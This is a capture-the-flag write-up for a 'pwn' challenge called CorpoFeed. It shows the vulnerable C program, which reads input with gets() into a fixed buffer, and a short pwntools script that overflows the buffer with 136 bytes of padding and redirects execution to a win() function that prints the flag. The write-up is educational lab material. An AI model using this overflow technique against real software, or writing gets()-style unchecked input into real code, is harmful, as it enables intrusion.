# CorpoFeed

## Description

```
Damn I hate these damn Corpos. I bet they don't even look at our feedback.
```

## Categories

- `pwn`

## Provided Files

- `CorpoFeed.zip`

## Solve Process

This was a very basic buffer overflow into win address exploit.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) { printf("flag: %s\n", getenv("FLAG")); }

int main(int argc, char *argv[]) {
  int feedback_fd = -1;
  int count;
  char feedback[0x6f] = {0};
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  puts("Welcome to the Corpo Feedback hotline!");
  puts("Please submit your feedback:");
  gets(feedback);
  feedback_fd = open("/dev/null", O_WRONLY);
  count = write(feedback_fd, feedback, sizeof(feedback));
  puts("Feedback has been submitted");
  close(feedback_fd);
}
```

We abuse `gets()` with the correct padding to reach the address of `win()`.

```py
from pwn import *

HOST = 'port.dyn.acsc.land'
PORT = 33454
BINARY = ELF('./CorpoFeed').path

r = remote(HOST, PORT)
#r = process(BINARY)

WIN_ADDR = 0x40121b

payload = b'A' * 136
payload += p64(WIN_ADDR)

r.sendline(payload)

output = r.recvuntil("}")
print(output.decode())
```

Straight forward, gets us the flag.
